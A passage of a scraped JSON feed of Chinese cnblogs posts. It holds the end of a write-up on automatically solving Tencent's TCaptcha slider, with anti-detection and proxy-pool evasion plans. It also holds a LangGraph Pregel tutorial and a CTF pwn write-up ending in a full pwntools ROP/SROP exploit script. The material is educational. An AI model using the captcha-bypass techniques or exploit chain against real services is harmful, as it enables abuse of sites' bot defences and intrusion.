HTTP 通信，调用 tcaptcha_client.prehandle 返回 CaptchaLayout 对象。算法层只负责图像处理，调用 solver.solve 返回 SolveResult 对象，包含 dx 和 confidence。执行层只负责 tdc.js 调用，调用 tdc_executor.get_tdc_data 返回包含 collect 和 eks 的字典。编排层组装所有组件，调用 automation.solve_captcha 返回 CaptchaPassResult 对象，包含 ok、ticket 和 randstr。这种设计使得每个模块职责单一，便于测试和维护。</p>\n<p>核心验证码模块只依赖 numpy 用于 NCC 计算，Pillow 用于图片解析，Node.js 加 jsdom 用于 tdc.js 执行。我们不依赖 TensorFlow 或 PyTorch 等深度学习框架，不依赖 OpenCV 图像处理库，不依赖 Selenium 或 Playwright 浏览器自动化工具，也不依赖任何第三方验证码识别服务。这使得项目部署简单，依赖少，维护成本低。</p>\n<h3 id=\"43-使用示例\">4.3 使用示例</h3>\n<p>如果只需要验证码破解功能，可以单独使用验证码模块。导入 solve_captcha 函数，传入 TCaptcha APP_ID，函数会自动完成整个验证码破解流程，返回包含 ticket 和 randstr 的结果对象。如果 result.ok 为 true，说明验证通过，可以从 result.ticket 和 result.randstr 获取凭证。如果为 false，可以从 result.error 获取错误信息。</p>\n<p>如果需要集成到登录流程，可以结合 FenbiLoginService 使用。首先创建 CookieHttpClient 和 FenbiLoginService 实例，然后调用 send_sms_code 发送短信验证码。如果返回的 r1.ok 为 false 且 r1.context_id 存在，说明触发了风控。此时调用 solve_captcha 自动过验证码，如果 cap.ok 为 true，调用 captcha_check 提交 ticket 和 randstr 放行风控，然后带着 context_id 重试发送短信。最后输入短信验证码调用 quicklogin 完成登录。</p>\n<h2 id=\"五技术总结与反思\">五、技术总结与反思</h2>\n<h3 id=\"51-关键数据\">5.1 关键数据</h3>\n<p>在 20 个真实 TCaptcha 样本上测试 NCC 求解精度，平均绝对误差为 0.10 像素，最大误差为 0.5 像素。在 5 次实时请求中，验证码通过率达到 100%，没有一次失败。单次求解总耗时约 5.6 秒，其中 NCC 计算耗时 0.3 秒，PoW 求解耗时小于 1 毫秒，TDC 执行耗时 0.5 秒。内存占用方面，单次验证码求解峰值为 30 MB，远低于浏览器自动化方案的 200-500 MB。外部依赖只有 numpy、Pillow 和 Node.js，核心模块完全不依赖深度学习框架。</p>\n<h3 id=\"52-技术亮点\">5.2 技术亮点</h3>\n<p>NCC 算法在滑块验证码场景下展现出了相比深度学习的优越性。在精度对比上，NCC 达到了 0.10 像素的平均绝对误差，这是亚像素级的精度，而深度学习模型通常只能达到 2-5 像素的精度。这是因为 TCaptcha 的图片质量稳定，分辨率固定，没有噪声干扰，缺口形状规则，是标准的拼图块。在这种场景下，NCC 是像素级的精确匹配，而深度学习是特征级的近似匹配，前者天然具有精度优势。当然，如果图片变化大、需要泛化能力，深度学习会更有优势，但对于 TCaptcha 这种特定场景，NCC 是最优选择。</p>\n<p>jsdom 执行 tdc.js 的方案体现了工程上的巧妙性。直接逆向 tdc.js 的混淆虚拟机成本极高，估计需要 2-3 周时间，而 jsdom 方案只需 1 天即可实现。关键洞察是 tdc.js 的目的是采集设备指纹，而非实现加密算法，jsdom 提供的浏览器环境足够真实，能通过大部分检测。即使 tdc.js 更新版本，也无需修改代码，自动适配新版本。当然，潜在风险是 jsdom 的 Canvas 指纹与真实浏览器有细微差异，未来 TCaptcha 可能增加 jsdom 特征检测。应对策略是定期监控通过率，一旦下降立即分析原因，准备 Plan B 使用 Puppeteer 在真实浏览器中执行 tdc.js。</p>\n<p>两阶段搜索的性能优化将计算量从 O(W×H) 降低到 O(W/4 + 13×11)。全图搜索需要 672×390 等于 262,080 次 NCC 计算，而两阶段搜索只需要 672 除以 4 加上 13×11，等于 168 加 143，总共 311 次 NCC 计算。性能提升了 262,080 除以 311，约等于 842 倍。实际耗时从理论上的 250 秒降低到 0.3 秒，这使得 NCC 算法在实时场景下完全可用。</p>\n<h3 id=\"53-反检测技术\">5.3 反检测技术</h3>\n<p>TCaptcha 的检测维度包括设备指纹、滑动轨迹、滑动耗时、PoW 计算时间、答案精度、HTTP 请求特征等多个方面。我们的应对策略是：设备指纹方面，使用 jsdom 模拟真实浏览器环境，目前已通过检测。滑动轨迹方面，使用 ease-in-out cubic 缓动函数加微抖动，模拟人类滑动的加速-匀速-减速过程，目前已通过检测。滑动耗时方面，随机生成 800-2000 毫秒，符合人类滑动的正常范围，目前已通过检测。PoW 计算时间方面，真实计算不伪造，目前已通过检测。答案精度方面，NCC 达到亚像素级精度，远超人类水平，目前已通过检测。HTTP 请求特征方面，完全模拟浏览器 Headers，目前已通过检测。</p>\n<p>未来可能的检测点包括 jsdom 特有的 navigator 属性、Canvas 指纹的统计学异常、高频请求的 IP 封禁等。对于 jsdom 特征检测，我们可以在 jsdom 环境中删除或修改特有属性。对于 Canvas 指纹异常，我们可以收集真实浏览器的 Canvas 指纹，在 jsdom 中伪造相同的指纹。对于 IP 封禁，我们可以使用代理池分散请求。</p>\n<h3 id=\"54-局限性与改进方向\">5.4 局限性与改进方向</h3>\n<p>当前方案的局限性主要有三点。第一是依赖 Node.js，tdc.js 执行需要 Node.js 环境，增加了部署复杂度。第二是单线程 NCC，未使用多核并行计算，有优化空间。第三是固定 APP_ID，只测试了粉笔的 TCaptcha，其他业务方可能有差异。</p>\n<p>改进方向包括纯 Python 实现 tdc.js、GPU 加速 NCC、深度学习混合方案等。纯 Python 实现 tdc.js 需要逆向 <code>__TENCENT_CHAOS_VM</code> 字节码格式，用 Python 实现 VM 解释器，难度极高，但可彻底去除 Node.js 依赖。GPU 加速 NCC 可以使用 CuPy 或 PyTorch 实现 NCC，理论上可将耗时从 0.3 秒降低到 0.05 秒，但需要 GPU 环境，不适合服务端部署。深度学习混合方案可以用 CNN 粗定位缺口区域降低搜索范围，用 NCC 精确计算位移保证精度，可能将耗时降低到 0.1 秒。</p>\n<h3 id=\"55-伦理与法律声明\">5.5 伦理与法律声明</h3>\n<p>本项目仅用于技术研究和学习目的，展示了验证码逆向工程的完整技术链路。请勿将本技术用于任何非法用途，如批量注册、刷单、爬虫等。验证码是网站的安全防护措施，绕过验证码可能违反服务条款。使用本技术造成的任何法律后果由使用者自行承担。合法使用场景包括自动化测试（测试自己的网站）、辅助功能（帮助视障用户）、学术研究（验证码安全性分析）等。</p>\n<h2 id=\"六结语\">六、结语</h2>\n<p>本项目从零开始，完整实现了对腾讯 TCaptcha 滑块验证码的自动化破解，涉及的技术栈包括协议逆向（HAR 分析、JSONP 解析、HTTP 协议模拟）、密码学（RSA/PKCS#1 v1.5 加密、MD5 PoW）、图像处理（NCC 模板匹配、Alpha 通道掩码、两阶段搜索）、JavaScript 逆向（tdc.js 混淆 VM、jsdom 沙箱执行）、算法设计（ease-in-out cubic 轨迹仿真、微抖动模拟）等多个领域。</p>\n<p>最终实现了 100% 通过率、5.6 秒求解、零深度学习依赖的工程化方案。这个项目证明了在特定场景下，传统算法（NCC）加工程技巧（jsdom）可以达到甚至超越深度学习的效果。希望本文能为验证码逆向、图像处理、反爬虫对抗等领域的研究者提供参考。</p>\n<p>‍</p>\n\n\n</div>\n<div id=\"MySignature\">\n    每天好一点点\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-17 17:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/han5562877\">嚯嚯歪</a>&nbsp;\n阅读(<span id=\"post_view_count\">104</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "[拆解LangChain执行引擎]静态上下文在Pregel中的应用",
      "link": "https://www.cnblogs.com/jaydenai/p/19621105/static-context-in-pregel",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19621105/static-context-in-pregel\" id=\"cb_post_title_url\" title=\"发布于 2026-02-17 08:23\">\n    <span>[拆解LangChain执行引擎]静态上下文在Pregel中的应用</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        在 Pregel 模型中，静态上下文是一个专门设计的依赖注入容器。它的出现是为了解决在复杂的图计算中，如何优雅地处理“不属于图状态，但Node运行又必须依赖的外部环境信息”这一痛点。这些数据具有一个共同的性质，那就是在整个运行生命周期内只读且固定。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在 Pregel 模型中，静态上下文是一个专门设计的依赖注入容器。它的出现是为了解决在复杂的图计算中，如何优雅地处理“不属于图状态，但Node运行又必须依赖的外部环境信息”这一痛点。这些数据具有一个共同的性质，那就是在整个运行生命周期内只读且固定，比如：</p>\n<ul>\n<li>身份信息：当前发起请求的user_id、org_id。</li>\n<li>外部客户端：已实例化的db_connection、redis_client、vector_store。</li>\n<li>策略约束：当前任务的safety_level或budget_limit。</li>\n</ul>\n<p>静态上下文是 Pregel 运行时提供的一个类型安全的环境变量容器。它将执行环境（Context）与业务轨迹（State）物理隔离，使得大型 Agent 系统的架构更加模块化，也更容易在复杂的生产环境下进行测试和调试。</p>\n<p>不同于以往字典形式的配置，静态上下文采用强类型 Schema 定义方法。由于其静态只读的特性，它在整个生命周期内保持一致性。静态上下文具有<code>单次运行锁定</code>机制，这保证Pregel对象一旦被调用，上下文对象在所有Node、所有 Superstep中引用的是同一个内存地址。它的<code>非持久化</code>特性进一步确保它不会被写入Checkpoint，所以当Pregel因为错误停止并从断点恢复时，我们必须重新提供一个相同的上下文对象。综上所示，静态上下文作为非序列化的、运行时的<code>旁路注入</code>而存在。</p>\n<p>静态上下文在Pregel被作为<code>Runtime</code>的一部分来传递的。如下所示的Runtime类的泛型参数ConextT指的就是静态上下文数据类型。除了返回该上下文的<code>context</code>字段，Runtime还具有额外三个字段分别返回用于长期存储的<code>store</code>字段（返回一个BaseStore对象）、实现“custom”流模式的<code>stream_writer</code>字段（返回一个StreamWriter对象），以及提供当前会话上一个返回值的<code>previous</code>字段。</p>\n<pre><code class=\"language-python\">@dataclass(**_DC_KWARGS)\nclass Runtime(Generic[ContextT]):\n    context: ContextT = field(default=None\n    store: BaseStore | None = field(default=None)\n    stream_writer: StreamWriter = field(default=_no_op_stream_writer)\n    previous: Any = field(default=None)\n</code></pre>\n<p>Pregel节点的处理函数读取静态上下文比较繁琐，以为除了承载输入的参数（一般是一个字典），我们只能额外定义一个<code>RunnableConfig</code>类型的参数，意味着基本上出原始输入外的其他任务信息都得从这个RunnableConfig配置中提取。RunnableConfig是一个字典，所以我们要提取所需数据的前提是得预先知道对用得Key。这样设计也能理解，因为LangGraph.Prege在整个<code>LangChain宇宙</code>中作为<code>执行引擎</code>而存在，它相当于LangChain体系的<code>内核</code>。Pregel提供的API本就不是针对Agent应用开发者，对开发者友好不是Pregel得设计目标，保持这个内核足够简洁更重要。</p>\n<p>RunnableConfig对象会贯穿整个Pregel引擎的执行，上游流程利用这个它像下游传递所需的组件和控制信息，传递的信息大都被至于<code>configurable</code>子节点下。如果对应的Key以<code>__pregel_</code>作为前缀，表示该条目其实是由Pregel内部使用的。Runtime对应的Key为<code>__pregel_runtime</code>。</p>\n<p>如下这个例子演示了如何声明、指定和读取静态上下文。我们定义一个承载基本用户信息的UserInfo数据类型作为静态上下文的Schema。作为Pregel唯一的Node，其处理函数提供了一个<code>RunnableConfig</code>类型的参数，我们从中提供作为运行时的Runtime对象，进而得到作为静态上下文的UserInfo对象。</p>\n<pre><code class=\"language-python\">from langchain_core.runnables import RunnableConfig\nfrom langgraph.pregel import Pregel, NodeBuilder\nfrom typing import Any, Literal\nfrom langgraph.channels import LastValue\nfrom langgraph.runtime import Runtime\nfrom dataclasses import dataclass\n\n@dataclass\nclass UserInfo:\n    id: str\n    name: str\n    gender: Literal[\"male\", \"female\"]\n\ndef handle(args: dict[str, Any], config: RunnableConfig) -&gt; str:\n    runtime: Runtime = config[\"configurable\"][\"__pregel_runtime\"]\n    return runtime.context.__repr__()\n\nnode = (NodeBuilder()\n    .subscribe_only(\"start\")\n    .write_to(\"output\")\n    .do(handle))\n    \napp = Pregel(\n    nodes={\"body\": node},\n    channels={\"start\": LastValue(None), \"output\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[\"output\"],\n    context_schema=UserInfo,\n)\n\nuser = UserInfo(id=\"123\", name=\"Alice\", gender=\"female\")\nresult = app.invoke(input={\"start\": None}, context=user)\nassert result[\"output\"] == user.__repr__()\n</code></pre>\n<p>在创建Pregel对象的时候，作为静态上下文的UserInfo类型直接以构造函数的<code>context_schema</code>参数进行声明。在调用其<code>invoke</code>方法的时候就通过context参数将指定的UserInfo对象作为静态上下文传递。静态上下文的设计初衷就是为了规避序列化的限制。它允许我们将复杂的、重量级的、带有外部依赖的对象的直接注入，而不会破坏 Pregel 模型对<code>状态一致性</code>和<code>可持久化</code>的要求。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-17 08:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\n阅读(<span id=\"post_view_count\">46</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "函数调用栈与Ret2all",
      "link": "https://www.cnblogs.com/firefly-star/p/19620531",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/firefly-star/p/19620531\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 21:19\">\n    <span>函数调用栈与Ret2all</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        The end of 2025 and stack\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"函数调用栈\">函数调用栈</h1>\n<h2 id=\"基础知识\">基础知识</h2>\n<p>寄存器： rip与eip：指令寄存器，cpu会把该寄存器地址内的数据当成指令执行（rip是64位系统的，eip是32位的）<br />\nrsp与esp：栈顶指针寄存器，表明了栈顶的位置<br />\nrbp与ebp：栈底指针寄存器，表明了栈底的位置</p>\n<p>elf文件在外存和内存中的情况如图<img alt=\"2N6XUQJ6L_T(EI3JRXE{)CM\" class=\"lazyload\" /></p>\n<p>最左边的RW与RX就是对应段的权限，R即read，读；W即write，写；x即execute，执行；可以看见外存中的文件最终执行时都会映射到内存中，内存中可以看见栈是由高地址往低地址增长的，堆是由低地址往高地址增长的。下面我们看当我们调用函数时发生了什么。比如如下程序，以64位为例</p>\n<p><img alt=\"84FX7HTTB`D(@VEPZ2NJM5\" class=\"lazyload\" /><br />\n首先看进入函数第一条指令，不是int，而是{，这个会被编译器解释成push rbp，mov rsp rbp，也就是先把rbp入栈，再把rsp抬上来，然后再sub rsp (一个立即数)  把rsp抬上去，效果如图<br />\n<img alt=\"I%EHN9HC59T4)Q@%WW})EK\" class=\"lazyload\" /></p>\n<p>然后是int，int就是声明变量，也就是把变量声明在rbp-多少，接下来继续执行就到了调用这个wow函数的时候了，调用函数时通过call指令，也就是先把当前指令的下一条指令的地址入栈（这个也就是我们常说的返回地址，我用back代替），接下来又进入wow函数的指令，这个函数第一条指令又是{，又把rbp入栈，因为rbp还是原来main函数的rbp，所以rbp1就是指向rbp的，rsp抬到rbp，如图所示<br />\n<img alt=\"S36(WXMSF~`(%EJPQ35B{7\" class=\"lazyload\" /><br />\n接下来又是sub rsp (一个立即数)，把rsp往上抬，然后是int c;声明一个变量c，效果如图<br />\n<img alt=\"6IZ$2H)A7(3{ENKG)8Z_XXX\" class=\"lazyload\" /><br />\n其实栈溢出的原理就是通过往c写值，覆盖栈上的这个返回地址，我们接下来看我们没改返回地址的时候函数返回是怎么返回的，首先有一个leave指令，这个指令就是mov rsp rbp</p>\n<p><img alt=\"E{`R{BSFVR~GAW8LFOTI0\" class=\"lazyload\" /><br />\n然后pop rbp把rsp位置的值弹出栈，赋给rbp，这时rbp已经回到main函数那里了<br />\n<img alt=\"T(6PQG7T_{V_0${C8RB@JD\" class=\"lazyload\" /></p>\n<p>此时并不会直接把上面c变量的数值销毁，而是在将来声明变量时可以再往这声明，leave之后接下来是ret，ret就是pop rip，把wow返回地址赋给指令寄存器，接下来就再跳转过去执行指令。</p>\n<p>这里就可以看出栈溢出的原理了，因为我们往栈上写值是由低地址往高地址写(图中由上往下)，所以只要我们有能写出c这个变量大小的条件，就可以把rbp及返回地址覆盖，接下来就会返回我们写成的返回地址，接下来就会去我们想让他返回的地方执行指令。</p>\n<h2 id=\"rop链原理\">rop链原理</h2>\n<p>其实rop链就是开了栈不可执行(NX保护)时，因为不能直接写汇编指令所以通过一些代码片段(gadget)去控制各寄存器，并通过ret链接起来的指令，比如有一个地址中的地址是pop rdi;ret，那我们返回地址写成这个指令的地址后，他就会执行这个指令pop rdi，然后就是ret，因为rsp没变，所以他还是在栈上取值，所以接下来就由可以填我们想让他返回到的地址了。</p>\n<h2 id=\"栈迁移原理\">栈迁移原理</h2>\n<p>栈迁移简单来说就是控制rsp，主要通过控制rbp然后进行两次leave去控制，第一次leave控制rbp，第二次leave通过控制的rbp进而控制寄存器,下面以迁移到bss段为例，第一次leave;ret:先mov rsp rbp</p>\n<p><img alt=\"C}`79BKB$1RTBYWL$X(QTI\" class=\"lazyload\" /></p>\n<p>pop rbp之后<br />\n<img alt=\"BA`BS9@63E2JK4~}5SDK8L\" class=\"lazyload\" /></p>\n<p>接下来是ret，继续执行返回地址内的指令,至此第一次leave;ret结束。因为返回地址还是leave;ret，所以有第二次leave;ret：<br />\n先mov rsp rbp<br />\n<img alt=\"O2)PBM{2$L9XG@PG71W}}`G\" class=\"lazyload\" /><br />\n接下来是pop rbp然后就是ret，在bss里取值继续执行了。从图中也可以看到，rsp与rbp都被我们控制了，函数的栈已经变化了，所以叫栈迁移。具体的攻击可以看看我之前的文章。<a href=\"https://www.cnblogs.com/firefly-star/p/19407067\" target=\"_blank\">ret2csu与栈迁移的运用</a></p>\n<h2 id=\"栈返回\">栈返回</h2>\n<p>看到这不知道各位有没有想过，既然我们自己定义的函数(这里的例子就是wow)有返回地址，那c语言库里的read，printf，write....等函数有没有返回地址呢，好像没听过？首先，他们也是有返回地址的，因为调用他们也需要call这个指令，这个指令就会把下条指令的地址入栈，只是因为调用他们的时候栈已经类似这个样子了<br />\n<img alt=\"6IZ$2H)A7(3{ENKG)8Z_XXX\" class=\"lazyload\" /></p>\n<p>所以哪怕这时候rsp的地方写了一条返回地址，我们在栈上的局部变量c里写值也是覆盖不到这个地址的，所以一般用不到这个手法。当然既然是一般就有例外，比如格式化字符串可以改printf函数的返回地址，read如果能控制写入的地址也可以改到(也得溢出一次才有可能)</p>\n<h2 id=\"栈对齐的原因及解决办法\">栈对齐的原因及解决办法</h2>\n<p>栈对齐就是为什么有时候我们返回system的时候要加个ret，实际上就是栈没对齐通过加ret对齐。栈对齐就是rsp指针要16字节对齐，因为系统调用的时候要求要对齐，也就是rsp最后一个16进制位要是0。关于这个原因就是个人观点了，我个人理解的应该比较浅，我认为就是系统本身肯定会让rsp对齐以免我们自己调用system函数的时候崩溃，但我们往返回地址后面可能写很多指令的地址，所以就导致了不对齐。解决办法: 因为64位下栈的内存单元是以8为单位的，也就是我们rsp的地址的最后一个16进制只有8和0两种可能，并且正常是rsp的末位8，这样在接下来的system函数里，因为他会push rbp,这样rsp就16字节对齐了，所以我们不对齐就说明rsp的末位是0，这样system函数push rbp之后rsp就是8字节对齐(末位是8了)，这里我们要么选择加一条指令的地址(加ret)要么就把返回地址往后写，跳过push rbp这个指令。不过也有例外，如果我们栈迁移迁到了末尾不是0也不是8的地址，加再多ret也没用，这时候就要修改迁移的位置了。</p>\n<h1 id=\"ret2all\">Ret2all</h1>\n<p>好了你已经学会函数调用栈了，快来写一道栈溢出吧。</p>\n<p><img alt=\"%TEP143FYN0V%}N{MKI\" class=\"lazyload\" /><br />\n这题保护除了canary都开了，第一个init给了我们rbp与ret（这两个在bss段上），ret可以泄露pie基地址，所以pie保护就跟没开一样了，后面用mprotect把bss段设成只读了，并且把标准错误给关了，后面开了沙盒。<br />\n<img alt=\"$S_FMVUJ5RRF65A8ZMR)A\" class=\"lazyload\" /><br />\n把execve，read，write分支都禁了并且下面write的文件描述符只能是2，read的文件描述符只能是0。后面有个栈溢出，溢出0x28字节<br />\n<img alt=\"`V{OT$DH{75328S1WROLI\" class=\"lazyload\" /></p>\n<p><img alt=\"19O3X~YGE8}3XIJ7TQ3IOD\" class=\"lazyload\" /></p>\n<p>这个是影子，首先检测前0x60是不是\"I love you I feel lonely\"字符串，后面检测rbp与ret是不是之前发给我们的，相当于只能溢出0x18了，并且还只能溢出到返回地址+8的位置。不过这里因为他调用了三次函数，所以会leave三次，就有栈迁移的机会，并且在read到0x88的地方正好是rbp最后一次指向的地方，也就是两次leave就到了我们可以控制的地方，我们把写成我们返回地址+8的地址就可以实现一次read了<br />\n<img alt=\"ZOM}~FZ59(@L(2Q)2S\" class=\"lazyload\" /></p>\n<p>但这里要注意，read之后不会直接返回，而是会进影子，所以这里我们read写入的地方有讲究，要能覆盖过我们call read的返回地址，实现栈返回，即往rsp的上方写。<br />\n<img alt=\"4X1(O6@5X$85)}4FHDX(O\" class=\"lazyload\" /><br />\n这里只要覆盖掉rsp就可以逃出影子了，因为目前泄露不出libc，所以只能用栈上现有的libc地址，我们可以找一下附近的，因为我们最多覆盖一字节，因为远程libc基址大部分是000结尾的，我们覆盖一字节是可以确保每次都能利用，如果覆盖两字节就需要爆破凭运气了。<br />\n<img alt=\"CO~10V{RTPYTD0{QIP4$}9\" class=\"lazyload\" /></p>\n<p>这里有一个syscall，但这个syscall不是特别好，因为如果我们用这个syscall调用函数后面有一个jmp，他不是ret，就比较难预测了。所以我们第一次syscall调用srop来控制rbx，之后配合magicgadget改成应该好用的gadget。改好之后就可以调用dup2(1,2)把标准输出的内容复制到标准错误，接下来就可以write泄露libc，有libc之后就先close(0)，让open打开的文件描述符是0，这样read就可以往栈内写flag了，最后再write打印出来flag就结束了。而这就需要我们在syscall下面先布置好srop的SigreturnFrame结构，这里因为长度有限不能用pwntools的函数。只能手搓了。并且要注意一下往下写需要rsp在下面，因为我们read还有影子跟着，所以rsp在下面才能实现栈返回，所以第一次往下写是逃不了影子的，简单来说就是先往下，然后leave上来，再leave下去就好了(这里上下是相对syscall来说的，这是这题最关键的部分）。大概效果是这样<br />\n<img alt=\"SMCYK`YCX%F8JAEDR$QTXAC\" class=\"lazyload\" /></p>\n<p>因为一开始的rbp是定死的，所以我们要注意在第一次的rbp上放好下面的地址就可以了，只要能调出一次srop就好办很多了，srop结构如下<br />\n<img alt=\"QCEGSM~4(_)Y0I3UKO)E38Y\" class=\"lazyload\" /><br />\n这里就是从左往右读，第一个是syscall，第二个是uc_flags第三个是&amp;uc之后依次读下去，大概离syscall0x70的位置是rdi，之后调用完一次srop要往syscall下面一个位置写一个leave，并且这个leave末尾要小于4，因为这样syscall ret之后就是leave，我们只要控制rbp就可以继续控制程序流。之后多布局一下就差不多写完了这题，多调试就好。这里因为我的本地环境跟远程不一样，所以应该是打不了远程的，不过可以参考一下，应该布局上是大差不差了，估计是有些细节不一样。exp如下</p>\n<pre><code>from pwn import *\nimport sys\ncontext.log_level='debug'\ncontext.arch='amd64'\nflag = 0\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',30705)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu():\n\tpay=p64(0)+p64(0)+p64(1)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nru(b'RBP:')\nrbp=int(p.recvline(),16)\nprint(hex(rbp))\nru(b'RET:')\nret=int(p.recvline(),16)\npie=ret-0x1871\nre=pie+0x3FB8\nprbp=pie+0x1253\nmain=pie+0x1874\nmagic=pie+0x1252\ntarget=pie+0x4050\nleave=pie+0x1852\nret1=pie+0x18AC\nread=pie+0x182F\nread1=pie+0x1840\nprint(hex(pie))\npay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x18,read)+p64(rbp-0x10)\ndbg()\nsd(pay)\npause()\npay=flat({\n0x30:p64(rbp+0xc0+0x30),#rbo:0x48\n0x38:p64(read),\n0x40:p64(leave),\n0x48:p64(rbp+0xe0-0x10+0x30),\n0x50:p64(leave),\n0x58:p64(rbp+0xd0+0x30),\n0x60:p64(rbp-0x18),\n0x68:p64(leave),\n},filler=p64(ret1))#flat(prbp,rbp+0x72+8,read)\nsd(pay+b'\\xec')\npause()\npay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x90+0x60,read)+p64(leave)\nsd(pay)\npay=flat({\n0x0:p64(0),#fake\n0x8:p64(0),#rdi\n0x10:p64(rbp+0x30),#rsi\n0x18:p64(rbp+0x28+0x3d),#rbp\n0x20:p64(0x6ede9),#rbx\n0x28:p64(0x200),#rdx\n0x30:p64(0),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x40),#rsp\n0x48:p64(read1),\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(rbp+0x90+1+0x60+0x60),\n0x68:p64(read),\n0x70:p64(rbp+0x20),\n0x78:p64(leave),\n0x80:0,\n})\npause()\nsd(pay)\npay=b'b'*7+p64(prbp)\npause()\nsd(pay)\npay=p64(leave)+flat(ret1)*2+p64(magic)+flat(prbp,rbp+0x59+0x60,read,rbp+0x20,leave,rbp+0x70+0x60,read,read)\npay=pay.ljust(0x60,b'\\x00')+flat({\n0x0:p64(0),#fake\n0x8:p64(1),#rdi\n0x10:p64(2),#rsi\n0x18:p64(rbp+0x100),#rbp\n0x20:p64(0x6ede9),#rbx\n0x28:p64(0x200),#rdx\n0x30:p64(33),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x28),#rsp\n0x48:p64(ret1),\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(0),\n0x68:p64(0),\n0x70:p64(rbp+0x60+0x90),\n0x78:p64(read),\n0x80:0,\n})\nsd(pay)\n\npay=b'b'*7+p64(prbp)\nsd(pay)\n\npay=flat({\n0x0:p64(0),#fake\n0x8:p64(2),#rdi\n0x10:p64(re),#rsi\n0x18:p64(rbp+0x100-0x88),#rbp\n0x20:p64(0),#rbx\n0x28:p64(0x20),#rdx\n0x30:p64(1),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x28),#rsp\n0x48:p64(ret1),#rip\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(rbp+0x90+1+0x60+0x60),\n0x68:p64(read),\n0x70:p64(rbp+0x20),\n0x78:p64(leave),\n0x80:0,\n})\n\nsd(pay)\npay=b'b'*7+p64(prbp)\n\nsd(pay)\nru(b\"Keep it and...I love you\\n\")\n\nlibcbase=u64(rc(6).ljust(8,b'\\x00'))-libc.sym['read']\nre=libcbase+libc.sym['read']\nrax=libcbase+0xdd237\nrdi=libcbase+0x10f75b\nrsi=libcbase+0x110a4d\nend=libcbase+0x98fd5\nrbx=libcbase+0x586e4\nmdx3=libcbase+0xb0133\nprint(hex(libcbase))\npay=b'./flag\\x00\\x00'*2+flat(rdi,0,rsi,rbp+0xd8,rbx,0x1000,mdx3,0,0,0,re)\n\npause()\nsd(pay)\n\nsrop=SigreturnFrame()\nsrop.rax=3\nsrop.rdi=0\nsrop.rsi=0\nsrop.rsp=rbp+0x1e8\nsrop.rip=end\nsrop1=SigreturnFrame()\nsrop1.rax=2\nsrop1.rdi=rbp+0x70\nsrop1.rsi=0\nsrop1.rsp=rbp+0x1e8+0x110\nsrop1.rip=end\nsrop2=SigreturnFrame()\nsrop2.rax=0\nsrop2.rdi=0\nsrop2.rsi=rbp\nsrop2.rdx=0x50\nsrop2.rsp=rbp+0x1e8+0x110+0x110\nsrop2.rip=end\nsrop3=SigreturnFrame()\nsrop3.rax=1\nsrop3.rdi=2\nsrop3.rsi=rbp\nsrop3.rdx=0x50\nsrop3.rip=end\npay=flat(rax,0xf,end)+bytes(srop)+flat(rax,0xf,end)+bytes(srop1)+flat(rax,0xf,end)+bytes(srop2)+flat(rax,0xf,end)+bytes(srop3)\n\nsd(pay)\nti()\n</code></pre>\n<p>这里我用了11次send，跟标答不一样的就是他是泄露libc顺便控制了rdx，之后直接用srop链了，我是没顺便控制rdx，再凑了一下gadget，所以多了一次send。效果如下<br />\n<img alt=\"RRAVM4}FI(AN(G1CJAC_NB9\" class=\"lazyload\" /></p>\n<p>ret2all参考文章<a href=\"https://blog.csdn.net/j284886202/article/details/151363747\" rel=\"noopener nofollow\" target=\"_blank\">ret2all</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 21:19</span>&nbsp;\n<a href=\"https://www.cnblogs.com/firefly-star\">firefly_star</a>&nbsp;\n阅读(<span id=\"post_view_count\">98</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
